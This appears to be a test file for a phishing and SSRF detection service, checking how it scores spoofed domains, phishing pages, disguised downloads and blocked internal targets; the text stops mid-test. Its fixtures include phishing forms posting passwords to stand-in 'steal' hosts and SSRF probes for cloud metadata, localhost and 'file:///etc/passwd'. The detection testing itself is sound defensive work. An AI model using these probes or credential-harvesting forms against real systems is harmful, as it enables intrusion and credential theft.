import 'dotenv/config';
import http from 'node:http';
import test from 'node:test';
import assert from 'node:assert/strict';
import { createApp } from '../server.ts';
import { isPrivateOrReservedIp, validateTargetAgainstSsrf } from '../server/security/ssrfGuard.ts';
import { analyzeUrlIntelligence } from '../server/analyzers/urlIntelligence.ts';
import { analyzeDomainDeceptionAndIdentity } from '../server/analyzers/domainDeception.ts';
import { analyzeWebsiteContentAndBrand } from '../server/analyzers/contentAnalyzer.ts';
import { analyzeFileAndDownloads } from '../server/analyzers/fileAnalyzer.ts';
import { computeRiskAndSections } from '../server/analyzers/scoringEngine.ts';
import { analyzeSourceIntelligence } from '../server/analyzers/sourceIntelligence.ts';
import {
  assessDomainAuthenticity,
  classifyDomainRelationship,
  getOfficialRegistryStats,
  lookupDomainOwnership,
  pslParseHostname,
} from '../server/analyzers/officialDomainRegistry.ts';
import { runExternalThreatIntel } from '../server/providers/threatIntelManager.ts';
import { captureWebsiteScreenshot } from '../server/analyzers/screenshotEngine.ts';
import { validateAndNormalizeReportConsistency } from '../server/analyzers/consistencyValidator.ts';
import { analyzeScriptsWithAst } from '../server/analyzers/jsDataFlowAnalyzer.ts';
import { CorrelationEngine } from '../server/analyzers/correlationEngine.ts';
import { analyzeTargetXssVulnerabilities } from '../server/analyzers/xssAnalyzer.ts';
import { executeLevelBCloudBrowser } from '../server/analyzers/remoteBrowserAdapter.ts';
import {
  safeExternalHref,
  safeImageDataUrl,
  sanitizeSavedReport,
  sanitizeUrlParamForScan,
} from '../src/utils/sanitize.ts';
import type { CheckFinding, LevelBExecutionData, RedirectHop, ScanReport, ThreatProviderResult, TlsInspectionData } from '../server/types.ts';

function mockCleanProviders(): ThreatProviderResult[] {
  return [
    {
      providerId: 'virustotal',
      providerName: 'VirusTotal API v3',
      category: 'Multi-Engine Reputation',
      enabled: true,
      configured: true,
      operationalState: 'active',
      status: 'clean',
      verdictDetail: { en: '0 malicious', ar: '0 خبيث' },
      requiresKey: true,
    },
    {
      providerId: 'urlhaus',
      providerName: 'URLhaus (abuse.ch)',
      category: 'Malware URLs',
      enabled: true,
      configured: true,
      operationalState: 'active',
      status: 'clean',
      verdictDetail: { en: 'No listing', ar: 'لا يوجد سجل' },
      requiresKey: true,
    },
  ];
}

// 1. Phishing test page (Google Safe Browsing removed) must classify HIGH or CRITICAL
test('1. testsafebrowsing.appspot.com/s/phishing.html classifies HIGH or CRITICAL without GSB', () => {
  const url = 'https://testsafebrowsing.appspot.com/s/phishing.html';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Suspected phishing</title></head><body>
     <h1>Warning! Suspected Phishing Page</h1>
     <p>This page is a phishing page that mimics a dialogue to trick you into clicking a deceptive link.</p>
     <div><input type="password" name="pw" placeholder="Password" /></div>
     </body></html>`,
    'utf8'
  );

  const urlRes = analyzeUrlIntelligence(url, url);
  const deceptionRes = analyzeDomainDeceptionAndIdentity({
    submittedUrl: url,
    finalUrl: url,
    redirects: [{ step: 1, url, hostname: 'testsafebrowsing.appspot.com', protocol: 'https:', statusCode: 200, crossDomain: false, downgradedToHttp: false, latencyMs: 12 }],
    htmlBuffer: html,
    contentType: 'text/html',
  });
  const contentRes = analyzeWebsiteContentAndBrand(
    url,
    200,
    { 'content-type': 'text/html' },
    html,
    urlRes.suspiciousPathTokens
  );

  const scored = computeRiskAndSections(
    [...urlRes.findings, ...deceptionRes.findings, ...contentRes.findings],
    mockCleanProviders()
  );

  assert.ok(
    scored.classification === 'HIGH' || scored.classification === 'CRITICAL',
    `Expected HIGH or CRITICAL, got ${scored.classification} (${scored.riskScore})`
  );
  assert.ok(scored.riskScore >= 60);
});

// 2. IDN Homograph with Cyrillic confusables
test('2. IDN homograph with Cyrillic confusables (раураӏ.com) is flagged with codepoints', () => {
  const deceptive = 'https://xn--80a0af7a0a.com/login'; // punycode or direct unicode
  const cyrillicPaypal = 'https://\u0440\u0430\u0443\u0440\u0430\u04CF.com/signin';
  const res = analyzeDomainDeceptionAndIdentity({
    submittedUrl: cyrillicPaypal,
    finalUrl: deceptive,
    redirects: [],
  });
  assert.equal(res.data.confusableDetected, true);
  assert.ok(res.data.confusableCharacters.length >= 4);
  const f = res.findings.find((x) => x.id === 'deception-homograph-confusables');
  assert.equal(f?.status, 'failed');
});

// 3. Punycode apple confusable (xn--80ak6aa92e.com -> аррӏе.com)
test('3. Punycode domain xn--80ak6aa92e.com resolves skeleton to apple.com and fails check', () => {
  const url = 'https://xn--80ak6aa92e.com/';
  const res = analyzeDomainDeceptionAndIdentity({
    submittedUrl: url,
    finalUrl: url,
    redirects: [],
  });
  assert.equal(res.data.isPunycode, true);
  assert.equal(res.data.confusableDetected, true);
  assert.equal(res.data.typosquatTarget?.officialDomain, 'apple.com');
});

// 4. URL shortener detection
test('4. URL shorteners (bit.ly) are explicitly detected', () => {
  const url = 'https://bit.ly/3example';
  const urlRes = analyzeUrlIntelligence(url, url);
  assert.equal(urlRes.isShortener, true);
  const f = urlRes.findings.find((x) => x.id === 'url-shortener-check');
  assert.equal(f?.status, 'warning');
});

// 5. Redirect chain cross-domain + HTTPS->HTTP downgrade + confirmed Open Redirect
test('5. Open redirect confirmed only when query param external host matches actual cross-domain redirect', () => {
  const submitted = 'https://trusted-portal.example/go?next=https://evil-phish.example/login';
  const final = 'http://evil-phish.example/login';
  const hops: RedirectHop[] = [
    { step: 1, url: submitted, hostname: 'trusted-portal.example', protocol: 'https:', statusCode: 302, crossDomain: false, downgradedToHttp: false, latencyMs: 10 },
    { step: 2, url: final, hostname: 'evil-phish.example', protocol: 'http:', statusCode: 200, crossDomain: true, downgradedToHttp: true, latencyMs: 15 },
  ];
  const res = analyzeDomainDeceptionAndIdentity({ submittedUrl: submitted, finalUrl: final, redirects: hops });
  assert.equal(res.data.openRedirectConfirmed, true);
  assert.equal(res.data.embeddedRedirectUrls.length, 1);

  // Contrast: ?next= param present with NO actual redirect -> NOT confirmed open redirect
  const unconfirmed = analyzeDomainDeceptionAndIdentity({
    submittedUrl: submitted,
    finalUrl: submitted,
    redirects: [{ step: 1, url: submitted, hostname: 'trusted-portal.example', protocol: 'https:', statusCode: 200, crossDomain: false, downgradedToHttp: false, latencyMs: 10 }],
  });
  assert.equal(unconfirmed.data.openRedirectConfirmed, false);
});

// 6. @ Authority masking
test('6. @ Authority masking hides real destination host and fails deception check', () => {
  const url = 'https://paypal.com@evil-login.example/signin';
  const res = analyzeDomainDeceptionAndIdentity({
    submittedUrl: url,
    finalUrl: 'https://evil-login.example/signin',
    redirects: [],
  });
  assert.equal(res.data.authorityMasking, true);
  const f = res.findings.find((x) => x.id === 'deception-subdomain-identity-mismatch');
  assert.equal(f?.status, 'failed');
});

// 7. Subdomain spoofing
test('7. Subdomain spoofing (paypal.com.verify-account.xyz) detected and flagged', () => {
  const url = 'https://paypal.com.verify-account.xyz/login';
  const res = analyzeDomainDeceptionAndIdentity({
    submittedUrl: url,
    finalUrl: url,
    redirects: [],
  });
  assert.equal(res.data.subdomainSpoofing, true);
  assert.equal(res.data.spoofedTargetDomain, 'paypal.com');
});

// 8. Cross-origin password form + anchor mismatch
test('8. Cross-origin password form & anchor mismatch flagged as credential risk', () => {
  const url = 'https://account-check.example/login';
  const html = Buffer.from(
    `<html><head><title>Sign in</title></head><body>
     <form action="https://collector-drop.example/steal" method="POST">
       <input type="email" name="email" /><input type="password" name="pass" />
     </form>
     <a href="https://collector-drop.example/help">https://paypal.com/security</a>
     </body></html>`
  );
  const deception = analyzeDomainDeceptionAndIdentity({
    submittedUrl: url,
    finalUrl: url,
    redirects: [],
    htmlBuffer: html,
    contentType: 'text/html',
  });
  assert.equal(deception.data.visibleVsRealMismatches.length, 1);

  const content = analyzeWebsiteContentAndBrand(url, 200, { 'content-type': 'text/html' }, html);
  assert.equal(content.data?.crossOriginFormActions[0], 'https://collector-drop.example/steal');
  const cred = content.findings.find((x) => x.id === 'phishing-credential-harvesting');
  assert.equal(cred?.status, 'failed');
});

// 9. Missing API keys -> auth_required, NEVER clean
test('9. Missing VIRUSTOTAL_API_KEY and URLHAUS_AUTH_KEY report auth_required and NEVER clean', async () => {
  const prevVt = process.env.VIRUSTOTAL_API_KEY;
  const prevUh = process.env.URLHAUS_AUTH_KEY;
  delete process.env.VIRUSTOTAL_API_KEY;
  delete process.env.URLHAUS_AUTH_KEY;
  try {
    const res = await runExternalThreatIntel(
      'https://example.com',
      'example.com',
      'example.com',
      ['openphish', 'otx', 'urlscan']
    );
    const vt = res.providers.find((p) => p.providerId === 'virustotal');
    const uh = res.providers.find((p) => p.providerId === 'urlhaus');
    assert.equal(vt?.status, 'auth_required');
    assert.equal(uh?.status, 'auth_required');
    assert.notEqual(vt?.status, 'clean');
    assert.notEqual(uh?.status, 'clean');
  } finally {
    if (prevVt) process.env.VIRUSTOTAL_API_KEY = prevVt;
    if (prevUh) process.env.URLHAUS_AUTH_KEY = prevUh;
  }
});

// 10. External service failures cannot count as clean or produce SAFE_INDICATORS when feeds fail
test('10. Unavailable/failed threat feeds never count as clean and block SAFE_INDICATORS verdict', () => {
  const cleanChecking: CheckFinding[] = [
    {
      id: 'url-protocol-port',
      section: 'url_intelligence',
      test: { en: 'Proto', ar: 'Proto' },
      result: { en: 'HTTPS', ar: 'HTTPS' },
      status: 'pass',
      severity: 'informational',
      weight: 0,
      evidence: '443',
      explanation: { en: 'ok', ar: 'ok' },
      recommendedAction: { en: 'none', ar: 'none' },
      source: 'test',
      timestamp: new Date().toISOString(),
      confidence: 100,
    },
  ];
  const deadProviders: ThreatProviderResult[] = [
    {
      providerId: 'virustotal',
      providerName: 'VirusTotal',
      category: 'TI',
      enabled: true,
      configured: true,
      operationalState: 'unavailable',
      status: 'error',
      verdictDetail: { en: 'Timeout', ar: 'Timeout' },
      requiresKey: true,
    },
  ];
  const scored = computeRiskAndSections(cleanChecking, deadProviders);
  assert.equal(scored.summaryStats.availableProviders, 0);
  assert.equal(scored.classification, 'UNKNOWN');
  assert.notEqual(scored.classification, 'SAFE_INDICATORS');
});

// 11. SSRF localhost and cloud metadata endpoints blocked
test('11. SSRF guard blocks localhost and cloud metadata endpoints', async () => {
  await assert.rejects(() => validateTargetAgainstSsrf('http://localhost:3000/api/health'), /SSRF Guard/i);
  await assert.rejects(() => validateTargetAgainstSsrf('http://sub.localhost/secret'), /SSRF Guard/i);
  await assert.rejects(() => validateTargetAgainstSsrf('http://169.254.169.254/latest/meta-data/'), /SSRF Guard/i);
  await assert.rejects(() => validateTargetAgainstSsrf('http://metadata.google.internal/computeMetadata/v1/'), /SSRF Guard/i);
});

// 12. SSRF private RFC1918 IPs blocked
test('12. SSRF guard blocks RFC1918 and CGNAT private IPv4 ranges', async () => {
  for (const ip of ['10.0.0.1', '192.168.1.1', '172.16.5.10', '172.31.255.254', '127.0.0.1', '100.64.0.1']) {
    assert.equal(isPrivateOrReservedIp(ip), true, `Expected ${ip} to be blocked`);
    await assert.rejects(() => validateTargetAgainstSsrf(`http://${ip}/admin`), /SSRF Guard/i);
  }
  assert.equal(isPrivateOrReservedIp('93.184.216.34'), false);
});

// 13. SSRF IPv6 loopback, link-local, unique-local, NAT64 & IPv4-mapped blocked
test('13. SSRF guard blocks IPv6 loopback, link-local, ULA, NAT64, and IPv4-mapped addresses', () => {
  for (const ip of [
    '::1',
    '0:0:0:0:0:0:0:1',
    '::ffff:127.0.0.1',
    '::ffff:7f00:0001',
    'fe80::1ff:fe23:4567:890a',
    'fc00::1',
    'fd12:3456:789a::1',
    '64:ff9b::7f00:1',
  ]) {
    assert.equal(isPrivateOrReservedIp(ip), true, `Expected IPv6 ${ip} to be blocked`);
  }
});

// 14. DNS resolution / rebinding protection validates IP literal & scheme boundaries
test('14. SSRF guard blocks non-HTTP(S) schemes and validates resolved targets cleanly', async () => {
  await assert.rejects(() => validateTargetAgainstSsrf('file:///etc/passwd'), /Unsupported protocol|SSRF/i);
  await assert.rejects(() => validateTargetAgainstSsrf('javascript:alert(1)'), /Unsupported protocol|SSRF/i);
  await assert.rejects(() => validateTargetAgainstSsrf('http://0.0.0.0/'), /SSRF Guard/i);
});

// 15. Unavailable / invalid screenshot config returns honest unavailable/failed, zero fake image
test('15. Screenshot capture returns honest unavailable state with no image when key absent', async () => {
  const prevW = process.env.SCREENSHOT_WORKER_URL;
  const prevNeo = process.env.SCREENSHOTNEO_ACCESS_KEY;
  delete process.env.SCREENSHOT_WORKER_URL;
  delete process.env.SCREENSHOTNEO_ACCESS_KEY;
  try {
    const res = await captureWebsiteScreenshot('https://93.184.216.34/', 'desktop');
    assert.equal(res.screenshot.status, 'unavailable');
    assert.equal(res.screenshot.imageDataUrl, undefined);
    assert.equal(res.finding.status, 'unknown');
    assert.ok(res.screenshot.reason?.en?.includes('SCREENSHOTNEO_ACCESS_KEY'));
  } finally {
    if (prevW) process.env.SCREENSHOT_WORKER_URL = prevW;
    if (prevNeo) process.env.SCREENSHOTNEO_ACCESS_KEY = prevNeo;
  }
});

// 16. Unreachable / corrupted DOM content returns UNKNOWN (Insufficient Evidence), never SAFE_INDICATORS
test('16. Unreachable DOM content causes UNKNOWN (Insufficient Evidence) verdict, never NO_KNOWN_THREATS', () => {
  const content = analyzeWebsiteContentAndBrand('https://unreachable.example/', undefined, {}, undefined);
  assert.equal(content.findings[0].id, 'content-unavailable');
  assert.equal(content.findings[0].status, 'unknown');

  const scored = computeRiskAndSections(content.findings, mockCleanProviders());
  assert.equal(scored.classification, 'UNKNOWN');
  assert.equal(scored.verdict, 'Insufficient Evidence');
});

// 17. Dangerous disguised download (Windows PE MZ executable masquerading as .pdf)
test('17. File analyzer detects PE MZ executable masquerading as .pdf', () => {
  const fakePdfExe = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]); // MZ header
  const res = analyzeFileAndDownloads(
    'https://files.example/invoice_statement.pdf',
    { 'content-type': 'application/pdf', 'content-disposition': 'attachment; filename="invoice.pdf"' },
    fakePdfExe
  );
  assert.equal(res.isDirectDownload, true);
  assert.equal(res.directFile?.mimeMismatch, true);
  assert.equal(res.findings[0].status, 'failed');
  assert.equal(res.findings[0].severity, 'high');
});

// 18. Conflicting signals: Valid HTTPS + old PaaS domain + 0 threat feed hits + unwrapped password + fake update lure
test('18. Conflicting signals (valid HTTPS + 0 threat hits + unwrapped password + fake update) classify HIGH or CRITICAL', () => {
  const url = 'https://login-portal-test.web.app/update';
  const html = Buffer.from(
    `<html><body>
      <h2>Critical Security Alert: Your software is out-of-date! Update your browser immediately.</h2>
      <div><input type="text" name="user" /><input type="password" name="pwd" /></div>
    </body></html>`,
    'utf8'
  );
  const urlRes = analyzeUrlIntelligence(url, url);
  const contentRes = analyzeWebsiteContentAndBrand(url, 200, { 'content-type': 'text/html' }, html, urlRes.suspiciousPathTokens);
  const scored = computeRiskAndSections([...urlRes.findings, ...contentRes.findings], mockCleanProviders());

  assert.ok(
    scored.classification === 'HIGH' || scored.classification === 'CRITICAL',
    `Expected HIGH/CRITICAL despite HTTPS & clean feeds, got ${scored.classification}`
  );
  assert.notEqual(scored.classification, 'SAFE_INDICATORS');
  assert.ok(scored.topReasons.length > 0);
});

// 19. ScreenshotNeo integration handles live upstream response cleanly without returning fake images
test('19. ScreenshotNeo integration validates missing/invalid keys honestly without fake images', async () => {
  const prevW = process.env.SCREENSHOT_WORKER_URL;
  delete process.env.SCREENSHOT_WORKER_URL;
  try {
    const res = await captureWebsiteScreenshot('https://example.com', 'desktop');
    assert.ok(
      res.screenshot.status === 'unavailable' ||
        res.screenshot.status === 'failed' ||
        res.screenshot.status === 'captured'
    );
    if (res.screenshot.status !== 'captured') {
      assert.equal(res.screenshot.imageDataUrl, undefined);
      const enReason = res.screenshot.reason?.en?.toLowerCase() || '';
      assert.ok(enReason.includes('screenshotneo') || enReason.includes('access key'));
    }
  } finally {
    if (prevW) process.env.SCREENSHOT_WORKER_URL = prevW;
  }
});

// 20. PSL Extraction & Official Domain Registry Ownership vs Subdomain Spoofing Boundaries
test('20. PSL parsing distinguishes official apex/subdomain vs subdomain spoofing like google.com.example.org', () => {
  const google = pslParseHostname('www.google.com');
  assert.equal(google.eTldPlusOne, 'google.com');
  assert.equal(lookupDomainOwnership('www.google.com').matched, true);

  const accounts = pslParseHostname('accounts.google.com');
  assert.equal(accounts.eTldPlusOne, 'google.com');
  assert.equal(accounts.subdomain, 'accounts');
  const accOwn = lookupDomainOwnership('accounts.google.com');
  assert.equal(accOwn.matched, true);
  assert.equal(accOwn.isSubdomain, true);

  const spoof = pslParseHostname('google.com.example.org');
  assert.equal(spoof.eTldPlusOne, 'example.org');
  assert.equal(lookupDomainOwnership('google.com.example.org').matched, false);
});

// 21. Service Relationship System: Facebook <-> Instagram, Google <-> YouTube, CDN, OAuth/SSO
test('21. Service relationships recognize Meta, Google, CDN, and OAuth links without accusing spoofing', () => {
  const metaRel = classifyDomainRelationship('www.facebook.com', 'www.instagram.com');
  assert.equal(metaRel.isBenignOrAuthorized, true);
  assert.ok(metaRel.relationship === 'official_product' || metaRel.relationship === 'parent_company');

  const googleRel = classifyDomainRelationship('www.google.com', 'www.youtube.com');
  assert.equal(googleRel.isBenignOrAuthorized, true);

  const cdnRel = classifyDomainRelationship('github.com', 'cdnjs.cloudflare.com');
  assert.equal(cdnRel.isBenignOrAuthorized, true);
  assert.equal(cdnRel.relationship, 'authorized_third_party_provider');

  const oauthRel = classifyDomainRelationship('random-app.example', 'accounts.google.com');
  assert.equal(oauthRel.isBenignOrAuthorized, true);
  assert.equal(oauthRel.relationship, 'external_integration');

  // Verify redirect URL containing OAuth redirect_uri to same-org domain does not flag open redirect
  const oauthUrl = 'https://accounts.google.com/v3/signin?continue=https://www.youtube.com/';
  const oauthDeception = analyzeDomainDeceptionAndIdentity({
    submittedUrl: oauthUrl,
    finalUrl: oauthUrl,
    redirects: [],
  });
  assert.equal(oauthDeception.data.openRedirectConfirmed, false);
  assert.equal(oauthDeception.findings.some((f) => f.status === 'failed'), false);
});

// 22. All 8 Mandatory Official Websites classify as Official Domain Verified (Score 0, zero false positives)
test('22. All 8 official URLs classify as Official Domain Verified despite cross-service links, CSRF tokens, and SPA login inputs', () => {
  const officialTargets = [
    { url: 'https://www.google.com/', host: 'www.google.com', crossHref: 'https://www.youtube.com/', crossAction: 'https://accounts.google.com/ServiceLogin', rdapHint: 'MarkMonitor', asn: 'AS15169 Google LLC', issuer: 'WR2' },
    { url: 'https://accounts.google.com/', host: 'accounts.google.com', crossHref: 'https://www.google.com/', crossAction: 'https://accounts.google.com/signin', rdapHint: 'MarkMonitor', asn: 'AS15169 Google LLC', issuer: 'WR2' },
    { url: 'https://www.facebook.com/', host: 'www.facebook.com', crossHref: 'https://www.instagram.com/', crossAction: 'https://www.facebook.com/login/', rdapHint: 'RegistrarSafe', asn: 'AS32934 Meta Platforms', issuer: 'DigiCert' },
    { url: 'https://www.instagram.com/', host: 'www.instagram.com', crossHref: 'https://www.facebook.com/', crossAction: 'https://www.instagram.com/accounts/login/', rdapHint: 'RegistrarSafe', asn: 'AS32934 Meta Platforms', issuer: 'DigiCert' },
    { url: 'https://github.com/', host: 'github.com', crossHref: 'https://www.microsoft.com/', crossAction: 'https://github.com/session', rdapHint: 'MarkMonitor', asn: 'AS36459 GitHub, Inc.', issuer: 'Sectigo' },
    { url: 'https://www.microsoft.com/', host: 'www.microsoft.com', crossHref: 'https://github.com/', crossAction: 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize', rdapHint: 'MarkMonitor', asn: 'AS8075 Microsoft Corporation', issuer: 'Microsoft Azure TLS' },
    { url: 'https://www.apple.com/', host: 'www.apple.com', crossHref: 'https://www.icloud.com/', crossAction: 'https://appleid.apple.com/auth/authorize', rdapHint: 'CSC Corporate Domains', asn: 'AS714 Apple Inc.', issuer: 'Apple Public EV' },
    { url: 'https://www.youtube.com/', host: 'www.youtube.com', crossHref: 'https://www.google.com/', crossAction: 'https://accounts.google.com/ServiceLogin?service=youtube', rdapHint: 'MarkMonitor', asn: 'AS15169 Google LLC', issuer: 'WR2' },
  ];

  for (const target of officialTargets) {
    // Realistic modern HTML including hidden CSRF token, React unwrapped password, cross-product links, CDN assets
    const html = Buffer.from(
      `<!doctype html><html><head><title>${target.host}</title>
       <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
       </head><body>
       <header><a href="${target.crossHref}">Connected Service</a></header>
       <form action="${target.crossAction}" method="POST">
         <input type="hidden" name="authenticity_token" value="csrf_abc123" />
         <input type="email" name="email" />
         <input type="password" name="password" />
       </form>
       <div><input type="password" name="spa_passcode" /></div>
       </body></html>`,
      'utf8'
    );

    const urlRes = analyzeUrlIntelligence(target.url, target.url);
    const deceptionRes = analyzeDomainDeceptionAndIdentity({
      submittedUrl: target.url,
      finalUrl: target.url,
      redirects: [
        {
          step: 1,
          url: target.url,
          hostname: target.host,
          protocol: 'https:',
          statusCode: 200,
          crossDomain: false,
          downgradedToHttp: false,
          latencyMs: 25,
        },
      ],
      htmlBuffer: html,
      contentType: 'text/html',
    });
    const contentRes = analyzeWebsiteContentAndBrand(
      target.url,
      200,
      { 'content-type': 'text/html', server: 'cloudflare' },
      html,
      urlRes.suspiciousPathTokens
    );
    const sourceRes = analyzeSourceIntelligence(
      target.url,
      { 'content-type': 'text/html' }, // Missing CSP header intentionally tested (must NOT penalize score!)
      html
    );

    const authAssessment = assessDomainAuthenticity({
      hostname: target.host,
      dnsResolved: true,
      rdapRegistrar: target.rdapHint,
      asn: target.asn,
      tlsAuthorized: true,
      tlsExpired: false,
      tlsDomainMatches: true,
      tlsIssuer: target.issuer,
      deceptionDetected: deceptionRes.findings.some((f) => f.status === 'failed'),
    });

    const tlsData: TlsInspectionData = {
      httpsAvailable: true,
      authorized: true,
      protocol: 'TLSv1.3',
      cipher: 'TLS_AES_256_GCM_SHA384',
      issuer: target.issuer,
      domainMatches: true,
      expired: false,
      sanList: [target.host],
    };

    const allFindings = [
      ...urlRes.findings,
      ...deceptionRes.findings,
      ...contentRes.findings,
      ...sourceRes.findings,
    ];
    const scored = computeRiskAndSections(allFindings, mockCleanProviders(), {
      domainAuthenticity: authAssessment,
      tlsData,
      finalUrl: target.url,
    });

    assert.equal(scored.classification, 'OFFICIAL_DOMAIN_VERIFIED', `${target.url} got ${scored.classification}`);
    assert.equal(scored.verdict, 'Official Domain Verified', `${target.url} verdict was ${scored.verdict}`);
    assert.equal(scored.riskScore, 0, `${target.url} expected riskScore 0, got ${scored.riskScore}`);
    assert.equal(
      allFindings.some((f) => f.status === 'failed'),
      false,
      `${target.url} unexpectedly had failed findings`
    );
    assert.ok(scored.domainAuthenticity?.disclaimer?.en);
    assert.ok(scored.domainAuthenticity?.disclaimer?.ar);
    assert.ok(scored.separatedAssessments?.domainAuthenticity);
  }
});

// 23. All 5 Mandatory Lookalike Domains: Unverified/Non-Official, non-accusatory similarity vs spoofed subdomain
test('23. Lookalike domains never verify as official; google.com.example.org fails spoofing while similarity-only uses non-accusatory wording', () => {
  const similarityCases = [
    'https://google-login-example.com/',
    'https://g00gle-example.com/',
    'https://facebook-security-example.com/',
    'https://github-login-example.com/',
  ];

  const benignHtml = Buffer.from(
    '<!doctype html><html><head><title>Domain Parking</title></head><body><p>Informational page under construction.</p></body></html>',
    'utf8'
  );

  for (const url of similarityCases) {
    const host = new URL(url).hostname;
    const urlRes = analyzeUrlIntelligence(url, url);
    const deceptionRes = analyzeDomainDeceptionAndIdentity({
      submittedUrl: url,
      finalUrl: url,
      redirects: [],
      htmlBuffer: benignHtml,
      contentType: 'text/html',
    });
    const contentRes = analyzeWebsiteContentAndBrand(url, 200, { 'content-type': 'text/html' }, benignHtml, urlRes.suspiciousPathTokens);

    assert.equal(lookupDomainOwnership(host).matched, false, `${host} must NOT be in official ownership registry`);
    assert.equal(deceptionRes.data.similarityOnly, true, `${host} should be marked similarityOnly`);

    const auth = assessDomainAuthenticity({
      hostname: host,
      dnsResolved: true,
      tlsAuthorized: true,
      tlsDomainMatches: true,
      similarityTarget: deceptionRes.data.typosquatTarget
        ? {
            brand: deceptionRes.data.typosquatTarget.brand,
            officialDomain: deceptionRes.data.typosquatTarget.officialDomain,
            reason: 'Similarity only',
          }
        : undefined,
    });
    assert.equal(auth.status, 'brand_lookalike');
    assert.notEqual(auth.status, 'official_verified');

    const simFinding = [...deceptionRes.findings, ...contentRes.findings].find((f) =>
      f.result.ar.includes('تم اكتشاف تشابه في اسم النطاق مع علامة تجارية معروفة، ولم يتم إثبات الانتحال')
    );
    assert.ok(simFinding, `${host} must include required non-accusatory Arabic similarity message`);

    const scored = computeRiskAndSections(
      [...urlRes.findings, ...deceptionRes.findings, ...contentRes.findings],
      mockCleanProviders(),
      { domainAuthenticity: auth, finalUrl: url }
    );
    assert.equal(scored.classification, 'LOW', `${host} with benign HTML should be LOW risk, got ${scored.classification}`);
    assert.equal(scored.verdict, 'Low Risk');
  }

  // Case 5: google.com.example.org (PSL base is example.org -> Subdomain Spoofing)
  const spoofUrl = 'https://google.com.example.org/signin';
  const spoofDeception = analyzeDomainDeceptionAndIdentity({
    submittedUrl: spoofUrl,
    finalUrl: spoofUrl,
    redirects: [],
  });
  assert.equal(spoofDeception.data.eTldPlusOne, 'example.org');
  assert.equal(spoofDeception.data.subdomainSpoofing, true);
  assert.equal(spoofDeception.data.spoofedTargetDomain, 'google.com');
  const spoofStandalone = computeRiskAndSections(spoofDeception.findings, mockCleanProviders(), { finalUrl: spoofUrl });
  assert.ok(
    spoofStandalone.classification === 'MEDIUM' || spoofStandalone.classification === 'HIGH',
    `Expected google.com.example.org deception-only to be MEDIUM or HIGH, got ${spoofStandalone.classification}`
  );

  const spoofHtml = Buffer.from(
    '<html><head><title>Google Sign-in</title></head><body><form><input type="password" name="pw" /></form></body></html>',
    'utf8'
  );
  const spoofContent = analyzeWebsiteContentAndBrand(spoofUrl, 200, { 'content-type': 'text/html' }, spoofHtml);
  const spoofWithLogin = computeRiskAndSections(
    [...spoofDeception.findings, ...spoofContent.findings],
    mockCleanProviders(),
    { finalUrl: spoofUrl }
  );
  assert.ok(
    spoofWithLogin.classification === 'HIGH' || spoofWithLogin.classification === 'CRITICAL',
    `Expected google.com.example.org with login form to be HIGH or CRITICAL, got ${spoofWithLogin.classification}`
  );
});

// 24. Mandatory Rules: Weak-signal cap, Unknown != malicious, Compromised Official Domain Conflict, Provider Disagreement
test('24. Weak signals never stack past LOW, unknown domains return NO_KNOWN_THREATS, and provider/official conflicts disclose cleanly', () => {
  // A. Unrecognized neutral domain with HTTPS + missing CSP + clean providers -> NO_KNOWN_THREATS
  const unknownUrl = 'https://independent-studio-example.org/';
  const cleanHtml = Buffer.from('<html><head><title>Studio</title></head><body><p>Portfolio</p></body></html>');
  const uUrl = analyzeUrlIntelligence(unknownUrl, unknownUrl);
  const uContent = analyzeWebsiteContentAndBrand(unknownUrl, 200, { 'content-type': 'text/html' }, cleanHtml);
  const uSource = analyzeSourceIntelligence(unknownUrl, { 'content-type': 'text/html' }, cleanHtml);
  const uAuth = assessDomainAuthenticity({ hostname: 'independent-studio-example.org', dnsResolved: true, tlsAuthorized: true, tlsDomainMatches: true });

  const uScored = computeRiskAndSections([...uUrl.findings, ...uContent.findings, ...uSource.findings], mockCleanProviders(), {
    domainAuthenticity: uAuth,
    finalUrl: unknownUrl,
  });
  assert.equal(uScored.classification, 'NO_KNOWN_THREATS');
  assert.equal(uScored.verdict, 'No Known Threats');
  assert.equal(uScored.riskScore, 0);

  // B. Provider disagreement + Official Domain Compromised Page Conflict
  const googleCompromisedUrl = 'https://accounts.google.com/user-redirect-phish';
  const maliciousHtml = Buffer.from(
    '<html><body><h1>Urgent phishing alert</h1><p>Click to claim free airdrop crypto wallet verify now!</p><form action="https://drop.evil.example/steal" method="POST"><input type="password" name="pw" /></form></body></html>'
  );
  const gUrl = analyzeUrlIntelligence(googleCompromisedUrl, googleCompromisedUrl);
  const gContent = analyzeWebsiteContentAndBrand(googleCompromisedUrl, 200, { 'content-type': 'text/html' }, maliciousHtml);
  const gAuth = assessDomainAuthenticity({ hostname: 'accounts.google.com', dnsResolved: true, tlsAuthorized: true, tlsDomainMatches: true });
  const mixedProviders: ThreatProviderResult[] = [
    ...mockCleanProviders(),
    {
      providerId: 'urlscan',
      providerName: 'URLScan.io',
      category: 'Sandbox',
      enabled: true,
      configured: true,
      operationalState: 'active',
      status: 'flagged',
      verdictDetail: { en: 'Malicious', ar: 'خبيث' },
      requiresKey: false,
    },
  ];
  const gScored = computeRiskAndSections([...gUrl.findings, ...gContent.findings], mixedProviders, {
    domainAuthenticity: gAuth,
    tlsData: { httpsAvailable: true, authorized: true, sanList: ['accounts.google.com'] },
    finalUrl: googleCompromisedUrl,
  });
  assert.ok(gScored.classification === 'HIGH' || gScored.classification === 'CRITICAL');
  assert.notEqual(gScored.classification, 'OFFICIAL_DOMAIN_VERIFIED');
  assert.ok((gScored.conflictNotes?.length || 0) >= 1, 'Expected explicit conflictNotes disclosure');
});

// 25. Backend Security Hardening, Real HTTP Error Codes & Dynamic SEO Endpoints
test('25. HTTP server enforces sensitive path shields, real 404/403/500 statuses, CORS, and SEO endpoints', async () => {
  const app = await createApp({ enableVite: false });
  const srv = http.createServer(app);
  await new Promise<void>((resolve) => srv.listen(0, '127.0.0.1', resolve));
  const addr = srv.address() as { port: number };
  const base = `http://127.0.0.1:${addr.port}`;

  try {
    // Health & Providers
    const health = await fetch(`${base}/api/health`);
    assert.equal(health.status, 200);
    assert.equal(health.headers.get('x-powered-by'), null);
    assert.equal(health.headers.get('x-content-type-options'), 'nosniff');

    const provRes = await fetch(`${base}/api/providers`);
    assert.equal(provRes.status, 200);
    const provRaw = await provRes.text();
